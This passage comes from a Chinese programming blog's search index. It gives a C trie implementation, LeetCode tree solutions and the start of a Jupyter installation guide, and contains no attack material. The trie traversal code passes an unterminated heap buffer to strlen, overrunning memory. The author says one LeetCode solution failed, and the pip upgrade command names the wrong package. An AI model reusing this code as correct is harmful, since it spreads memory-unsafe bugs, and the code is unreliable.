class="line">    Node* ptr = root;</span><br><span class="line">    <span class="keyword">int</span> flag = TRUE;</span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'\0'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!append_node(ptr, c)) &#123;</span><br><span class="line">             flag = FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;children[c-<span class="string">'a'</span>];</span><br><span class="line">        c = *(++str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ptr-&gt;flag) &#123;</span><br><span class="line">        flag = FALSE;</span><br><span class="line">        ptr-&gt;flag = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的功能，将单词插入树中，假如目标单词已经存在于树中，则返回<code>FALSE</code> , 否则就能成功插入，返回<code>TRUE</code>。插入的过程比较简单，只要单词字母对应的节点存在，则继续往下查询，否则就创建新节点，然后在最后的一个字母的节点把<code>flag</code>改为<code>FALSE</code>;</p>
<h4 id="字典树的查找函数"><a href="#字典树的查找函数" class="headerlink" title="字典树的查找函数"></a>字典树的查找函数</h4><p>C 语言实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(Node* root, <span class="keyword">char</span>* word)</span> </span>&#123;</span><br><span class="line">    Node* ptr = root;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\"%s\" isn't in the Dictionary!\n"</span>, word);</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;children[word[i]-<span class="string">'a'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ptr &amp;&amp; ptr-&gt;flag) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\"%s\" is in the Dictionary!\n"</span>, word);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\"%s\" isn't in the Dictionary!\n"</span>, word);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字典树的遍历函数"><a href="#字典树的遍历函数" class="headerlink" title="字典树的遍历函数"></a>字典树的遍历函数</h4><p>C 语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(Node* root, <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len_of_str = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">char</span>* new_str = <span class="built_in">malloc</span>(len_of_str+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(new_str, str);</span><br><span class="line">    new_str[len_of_str] = root-&gt;character;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (root-&gt;flag) &#123;</span><br><span class="line">        <span class="comment">//输出</span></span><br><span class="line">        <span class="keyword">char</span>* str_for_print = <span class="built_in">malloc</span>(len_of_str+<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(str_for_print, new_str);</span><br><span class="line">        str_for_print[len_of_str+<span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str_for_print);</span><br><span class="line">        <span class="built_in">free</span>(str_for_print);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SUB_NODE_COUNT; i++) &#123;</span><br><span class="line">        traversal(root-&gt;children[i], new_str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(new_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很显然，这里用深度优先遍历比较合适，因为这是根据单词字母的组成来垂直扩展多叉树的。对于深度优先算法，递归是最能偷懒的方法啦！深度遍历的过程中，只要遇到<code>flag</code>等于<code>TRUE</code>，跟祖先节点构成单词输出，那就 OK 啦。</p>
<h4 id="字典树的删除函数"><a href="#字典树的删除函数" class="headerlink" title="字典树的删除函数"></a>字典树的删除函数</h4><p>C 语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLeave</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SUB_NODE_COUNT; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;children[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete_word</span><span class="params">(Node* root, <span class="keyword">char</span>* word)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="keyword">int</span> first_index = word[<span class="number">0</span>] - <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!root-&gt;children[first_index]) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;children[first_index]-&gt;flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeave(root-&gt;children[first_index])) &#123;</span><br><span class="line">                <span class="built_in">free</span>(root-&gt;children[first_index]);</span><br><span class="line">                root-&gt;children[first_index] = <span class="literal">NULL</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                root-&gt;children[first_index]-&gt;flag = FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag = delete_word(root-&gt;children[first_index], word+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (isLeave(root-&gt;children[first_index]) &amp;&amp; !root-&gt;children[first_index]-&gt;flag) &#123;</span><br><span class="line">        <span class="built_in">free</span>(root-&gt;children[first_index]);</span><br><span class="line">        root-&gt;children[first_index] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实删除一个单词最直接的方法就是把最后一个字母的<code>flag</code>改为<code>FALSE</code>就可以了。但是如果只是这么做的话，随着操作的次数增加，会产生许多多余的没必要的节点，浪费很多的空间。<br>因此这个函数需要完成两件事</p>
<ul>
<li>判断删除的单词是否存在，假如不存在则返回<code>FALSE</code>.</li>
<li>删除多余的节点。<br>节点必须同时满足以下两点才能定义为多余的节点。</li>
<li>没有子节点（叶子节点）</li>
<li>flag 的值为 FALSE</li>
</ul>
<h3 id="完整实现"><a href="#完整实现" class="headerlink" title="完整实现"></a>完整实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUB_NODE_COUNT 26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">children</span>[<span class="title">SUB_NODE_COUNT</span>];</span></span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">char</span> character;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="function">Node* <span class="title">create_node</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> flag)</span> </span>&#123;</span><br><span class="line">    Node* n = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    n-&gt;character = c;</span><br><span class="line">    n-&gt;flag = flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SUB_NODE_COUNT; i++) &#123;</span><br><span class="line">        n-&gt;children[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">append_node</span><span class="params">(Node* n, <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Node* child_ptr =  n-&gt;children[c-<span class="string">'a'</span>];</span><br><span class="line">    <span class="keyword">if</span> (child_ptr) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        n-&gt;children[c-<span class="string">'a'</span>] = create_node(c, FALSE);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_word</span><span class="params">(Node* root, <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c = *str;</span><br><span class="line">    Node* ptr = root;</span><br><span class="line">    <span class="keyword">int</span> flag = TRUE;</span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'\0'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!append_node(ptr, c)) &#123;</span><br><span class="line">             flag = FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;children[c-<span class="string">'a'</span>];</span><br><span class="line">        c = *(++str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ptr-&gt;flag) &#123;</span><br><span class="line">        flag = FALSE;</span><br><span class="line">        ptr-&gt;flag = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(Node* root, <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len_of_str = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">char</span>* new_str = <span class="built_in">malloc</span>(len_of_str+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(new_str, str);</span><br><span class="line">    new_str[len_of_str] = root-&gt;character;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (root-&gt;flag) &#123;</span><br><span class="line">        <span class="comment">//输出</span></span><br><span class="line">        <span class="keyword">char</span>* str_for_print = <span class="built_in">malloc</span>(len_of_str+<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(str_for_print, new_str);</span><br><span class="line">        str_for_print[len_of_str+<span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str_for_print);</span><br><span class="line">        <span class="built_in">free</span>(str_for_print);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SUB_NODE_COUNT; i++) &#123;</span><br><span class="line">        traversal(root-&gt;children[i], new_str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(new_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(Node* root, <span class="keyword">char</span>* word)</span> </span>&#123;</span><br><span class="line">    Node* ptr = root;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\"%s\" isn't in the Dictionary!\n"</span>, word);</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;children[word[i]-<span class="string">'a'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ptr &amp;&amp; ptr-&gt;flag) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\"%s\" is in the Dictionary!\n"</span>, word);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\"%s\" isn't in the Dictionary!\n"</span>, word);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLeave</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SUB_NODE_COUNT; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;children[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete_word</span><span class="params">(Node* root, <span class="keyword">char</span>* word)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="keyword">int</span> first_index = word[<span class="number">0</span>] - <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!root-&gt;children[first_index]) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;children[first_index]-&gt;flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeave(root-&gt;children[first_index])) &#123;</span><br><span class="line">                <span class="built_in">free</span>(root-&gt;children[first_index]);</span><br><span class="line">                root-&gt;children[first_index] = <span class="literal">NULL</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                root-&gt;children[first_index]-&gt;flag = FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag = delete_word(root-&gt;children[first_index], word+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (isLeave(root-&gt;children[first_index]) &amp;&amp; !root-&gt;children[first_index]-&gt;flag) &#123;</span><br><span class="line">        <span class="built_in">free</span>(root-&gt;children[first_index]);</span><br><span class="line">        root-&gt;children[first_index] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    Node *root = create_node(<span class="string">'$'</span>, FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//测试add_ word函数</span></span><br><span class="line">    add_word(root, <span class="string">"abc"</span>);</span><br><span class="line">    add_word(root, <span class="string">"abcd"</span>);</span><br><span class="line">    add_word(root, <span class="string">"world"</span>);</span><br><span class="line">    add_word(root, <span class="string">"nnaiodnf"</span>);</span><br><span class="line">    traversal(root, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//测试check函数</span></span><br><span class="line">    check(root, <span class="string">"abc"</span>);</span><br><span class="line">    check(root, <span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//测试delete_word函数</span></span><br><span class="line">    delete_word(root, <span class="string">"abe"</span>);</span><br><span class="line">    check(root, <span class="string">"abe"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reference:<a href="https://www.jianshu.com/p/72456ea14b1b" target="_blank" rel="noopener">用 C 语言实现字典树</a></p>
<h2 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h2><p>直接上链接，说的贼详细<br><a href="https://www.cnblogs.com/AC-King/p/7789013.html" target="_blank" rel="noopener">线段树详解</a></p>
<h2 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h2><p>直接上链接，说的贼详细<br><a href="https://www.cnblogs.com/xenny/p/9739600.html" target="_blank" rel="noopener">树状数组详解</a></p>
<h2 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h2><p>这个不是树，是图，就直接放链接吧<br><a href="https://blog.csdn.net/qq_39630587/article/details/77427044" target="_blank" rel="noopener">最小生成树构造算法</a><br><del><strong>其实是我学不动了</strong></del></p>
<h1 id="LeetCode-题解"><a href="#LeetCode-题解" class="headerlink" title="LeetCode 题解"></a>LeetCode 题解</h1><h2 id="LeetCode-题号-101-对称二叉树"><a href="#LeetCode-题号-101-对称二叉树" class="headerlink" title="LeetCode 题号: 101. 对称二叉树"></a>LeetCode 题号: 101. 对称二叉树</h2><p>话不多说，直接上代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(struct TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> fun(root-&gt;left, root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(struct TreeNode* left,struct TreeNode* right)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left == <span class="literal">NULL</span>&amp;&amp;right == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(left == <span class="literal">NULL</span> || right == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(left-&gt;val!=right-&gt;val)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fun(left-&gt;left,right-&gt;right)&amp;&amp;fun(left-&gt;right,right-&gt;left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路:如果同时满足下面的条件，两个树互为镜像：</p>
<ul>
<li>它们的两个根结点具有相同的值。</li>
<li>每个树的右子树都与另一个树的左子树镜像对称。<br>因此，我们就可以很自然地把上边的想法写成一个递归函数。</li>
</ul>
<h2 id="LeetCode-题号：96-不同的二叉搜索树"><a href="#LeetCode-题号：96-不同的二叉搜索树" class="headerlink" title="LeetCode 题号：96. 不同的二叉搜索树"></a>LeetCode 题号：96. 不同的二叉搜索树</h2><p>可以使用动态规划法求解<br>给定一个有序序列 1 … n，为了根据序列构建一棵二叉搜索树。我们可以遍历每个数字 i，将该数字作为树根，1 … (i-1) 序列将成为左子树，(i+1) … n 序列将成为右子树。于是，我们可以递归地从子序列构建子树。<br>在上述方法中，由于根各自不同，每棵二叉树都肯定能保证是独特的。<br>C 语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> * dp = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(n+<span class="number">2</span>));</span><br><span class="line">    bzero(dp,<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(n+<span class="number">2</span>));</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)&#123;</span><br><span class="line">            dp[i] += dp[j - <span class="number">1</span>] * dp[i - j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LeetCode-题号-99-恢复二叉搜索树"><a href="#LeetCode-题号-99-恢复二叉搜索树" class="headerlink" title="LeetCode 题号: 99. 恢复二叉搜索树"></a>LeetCode 题号: 99. 恢复二叉搜索树</h2><p>因为题目中说了，二叉搜索树中只有两个节点被错误地交换。并且，正常的二叉搜索树中序遍历输出应该是递增的。<br>所以，在遍历二叉树的过程中找到不满足递增的点（即错误交换的点），交换两者的值即可。<br>错误交换的点在中序遍历结果中可能是相邻的，也可能是不相邻的。<br>例如，若一棵树中序遍历结果 1324，错误交换的点 2 和 3 就是相邻的；使用 first 和 second 表示错误交换的两个点，在第一次遇到不递增的情况时，将 first 置为 3，second 置为 2，遍历结束后交换 first 与 second。</p>
<p>再如，若一棵树中序中序遍历结果 321，错误交换的点就是不相邻的。在第一次遇到不递增的情况时，将 first 设置为 3，second 设置为 2，在第二次遇到不递增的情况时，只改变 second，将 second 置为 1.遍历结束后交换 first 与 second。<br>将这个想法写成代码，就成了下面这个样子。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">first</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">second</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">pre</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(struct TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">    inorder(root-&gt;left);</span><br><span class="line">     <span class="keyword">if</span>(pre != <span class="literal">NULL</span> &amp;&amp; pre-&gt;val &gt; root-&gt;val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(first == <span class="literal">NULL</span>)&#123;<span class="comment">//first为空,首次找到前后大小不对的点</span></span><br><span class="line">            first = pre;</span><br><span class="line">            second = root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//first不为空,第二次找到前后大小不对的点,只更新second</span></span><br><span class="line">            second = root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pre = root;</span><br><span class="line">    inorder(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recoverTree</span><span class="params">(struct TreeNode* root)</span></span>&#123;</span><br><span class="line">    inorder(root);</span><br><span class="line">    <span class="keyword">int</span> tmp = first-&gt;val;</span><br><span class="line">    first-&gt;val = second-&gt;val;</span><br><span class="line">    second-&gt;val = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然而并没有 AC，就先洗洗睡了</p>
<h1 id="我保证"><a href="#我保证" class="headerlink" title="我保证"></a>我保证</h1><p>会把线段树、树状数组、最小生成树认真学了<br>就这样，先咕为敬！<br>有空再补！<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/1571031606850.gif" alt="咕咕咕"><br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/924112618.png" alt="笑着看着你"></p>
]]></content>
      <tags>
        <tag>C</tag>
        <tag>Learning</tag>
        <tag>Data Structure</tag>
        <tag>Tree</tag>
        <tag>Binary Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Jupyter的安装与使用</title>
    <url>/2020/01/19/Jupyter%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>最近开始学习 Python，但是臃肿的 Visual Studio 启动和编译速度极慢，直接使用命令行又没法保存我敲的代码。于是乎，我就想整一个又能即时保存我敲的代码，又能快速地运行 Python 程序，最好还能支持 Markdown，让我能够边学习边做笔记。在经过了一番寻找过后，我找到了这款神器：Jupyter</p>
<a id="more"></a>

<h1 id="Jupyter-简介"><a href="#Jupyter-简介" class="headerlink" title="Jupyter 简介"></a>Jupyter 简介</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Jupyter Notebook是一个Web应用程序，允许您创建和共享包含实时代码，方程，可视化和说明文本的文档。</span><br><span class="line">用途包括：数据清理和转换，数值模拟，统计建模，机器学习等等。</span><br></pre></td></tr></table></figure>

<p>在 Notebooks 中不仅可以运行 Python 语言，它还支持 R、Julia 和 Javascript 等等语言。</p>
<h1 id="安装-Jupyter-Notebooks"><a href="#安装-Jupyter-Notebooks" class="headerlink" title="安装 Jupyter Notebooks"></a>安装 Jupyter Notebooks</h1><h2 id="通过-pip-安装"><a href="#通过-pip-安装" class="headerlink" title="通过 pip 安装"></a>通过 pip 安装</h2><p>既然你都已经想要安装 Jupyter 了，那么我想 Python 总已经安装并配置好了吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意：Python中默认安装的版本：</span><br><span class="line">Python 2.7.9及后续版本：默认安装，命令为pip</span><br><span class="line">Python 3.4及后续版本：默认安装，命令为pip3</span><br></pre></td></tr></table></figure>

<h3 id="升级-pip-到最新版本"><a href="#升级-pip-到最新版本" class="headerlink" title="升级 pip 到最新版本"></a>升级 pip 到最新版本</h3><p>打开<code>cmd</code>，并切换到 Python 的安装目录下的 Scripts 文件夹，然后执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade pip3</span><br></pre></td></tr></table></figure>

<h3 id="安装-Jupyter-Noteboooks"><a href="#安装-Jupyter-Noteboooks" class="headerlink" title="安装 Jupyter Noteboooks"></a>安装 Jupyter Noteboooks</h3><p>接下来执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install jupyter</span><br></pre></td></tr></table></figure>

<p>等待进度条跑完即可<br>（u1s1，pip 是真的方便</p>
<h3 id="运行-Jupyter-Notebooks"><a href="#运行-Jupyter-Notebooks" class="headerlink" title="运行 Jupyter Notebooks"></a>运行 Jupyter Notebooks</h3><p>切换到 Python 的安装目录下的 Scripts 文件夹。执行如下命令</p>
